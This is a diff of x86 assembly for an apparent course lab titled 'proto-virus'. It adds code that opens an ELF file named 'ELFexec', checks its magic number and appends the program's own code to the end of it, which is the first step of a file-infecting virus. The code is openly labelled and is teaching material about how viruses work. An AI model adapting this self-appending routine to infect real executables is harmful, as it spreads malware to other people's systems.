@@ -64,6 +64,7 @@
 global _start
 
 section .text
+virus_start:
 get_anchor_loc:
     call anchor
 anchor:
@@ -71,7 +72,7 @@ anchor:
     ret
 
 msg: db "This is a virus", 10, 0
-msg_len: EQU $ - msg - 1
+msg_len EQU $ - msg - 1
 
 _start:
     %push
@@ -83,6 +84,10 @@ _start:
 ; You code for this lab goes here
     %define %$loc ebp-4
     %define %$fd ebp-8
+    %define %$fsz ebp-12
+    %define %$mag ebp-16
+    %define %$p_mag ebp-20
+    %define %$virus_code_size ebp-24
 
     .print_msg:
     get_lbl_loc [%$loc], msg
@@ -103,9 +108,9 @@ _start:
     mov dword [%$fd], eax
 
     .read_elf_magic_number:
-    %define %$mag ebp-12
-    lea ecx, [%$mag]
-    read [%$fd], ecx, 4
+    lea eax, [%$mag]
+    mov dword [%$p_mag], eax
+    read [%$fd], [%$p_mag], 4
 
     .check_elf_magic_number:
     cmp byte [%$mag], 0x7f
@@ -118,25 +123,37 @@ _start:
     jne .invalid_elf_magic_number
 
     .valid_elf_magic_number:
-    jmp .append_code_to_end_of_file
+    jmp .seek_to_end
 
     .invalid_elf_magic_number:
     exit 2
 
-    .append_code_to_end_of_file:
-    
+    .seek_to_end:
+    lseek [%$fd], 0, SEEK_END
+    mov [%$fsz], eax
+
+    .append_virus_code:
+    get_lbl_loc [%$loc], virus_start
+    get_lbl_loc virus_end
+    sub edx, [%$loc]
+    mov dword [%$virus_code_size], edx
+    get_lbl_loc [%$loc], virus_start
+    write [%$fd], [%$loc], [%$virus_code_size]
+
+    .close_file:
+    close [%$fd]
 
 VirusExit:
-       exit 0            ; Termination if all is OK and no previous code to jump to
-                         ; (also an example for use of above macros)
+       exit 0 ; Termination if all is OK and no previous code to jump to
+              ; (also an example for use of above macros)
     
 FileName: db "ELFexec", 0
 
 OutStr: db "The lab 9 proto-virus strikes!", 10, 0
-OutStr_len: EQU $ - OutStr - 1
+OutStr_len EQU $ - OutStr - 1
 
 Failstr: db "perhaps not", 10 , 0
-Failstr_len: EQU $ - Failstr - 1
+Failstr_len EQU $ - Failstr - 1
 
 PreviousEntryPoint: dd VirusExit
 virus_end:
